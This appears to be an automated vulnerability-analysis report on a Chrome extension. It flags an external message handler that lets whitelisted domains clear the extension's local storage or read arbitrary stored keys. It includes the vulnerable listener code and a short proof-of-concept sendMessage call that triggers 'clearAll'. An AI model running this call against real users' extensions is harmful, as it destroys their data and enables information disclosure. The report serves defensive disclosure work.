# CoCo Analysis: afmemjjekcdkgpnladhmgglocgfkaali

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_clear_sink

**CoCo Trace:**
- Sink detected: `chrome_storage_local_clear_sink`
- Source: External messages via `chrome.runtime.onMessageExternal`

**Code:**

```javascript
// Background script (bg.js) - Lines 985-1013
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
  switch (request.method) {
    case "getVersion":
      const manifest = chrome.runtime.getManifest();
      sendResponse({
        type: "success",
        version: chrome.runtime.manifest.version,
      });
      break;
    case "getItem":
      chrome.storage.local.get(request.key).then((data) => { // ← attacker-controlled key
        sendResponse({
          data: data[request.key],
        });
      });
      break;
    case "clearAll":
      chrome.storage.local.clear().then(() => { // ← Storage cleared
        sendResponse({
          data: true,
        });
      });
      break;
    default:
      console.log("no method");
      break;
  }
  return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via `chrome.runtime.onMessageExternal` from whitelisted domains (https://bun-ken.net/*, https://staging.bun-ken.net/*)

**Attack:**

```javascript
// From whitelisted domain (e.g., https://bun-ken.net/)
chrome.runtime.sendMessage(
  "afmemjjekcdkgpnladhmgglocgfkaali", // Extension ID
  { method: "clearAll" },
  function(response) {
    console.log("Storage cleared:", response.data);
  }
);
```

**Impact:** An attacker controlling or compromising one of the whitelisted domains (bun-ken.net or staging.bun-ken.net) can clear all local storage data for the extension, causing data loss and disrupting extension functionality. The extension also exposes the ability to read arbitrary storage keys via the "getItem" method, leading to potential information disclosure.
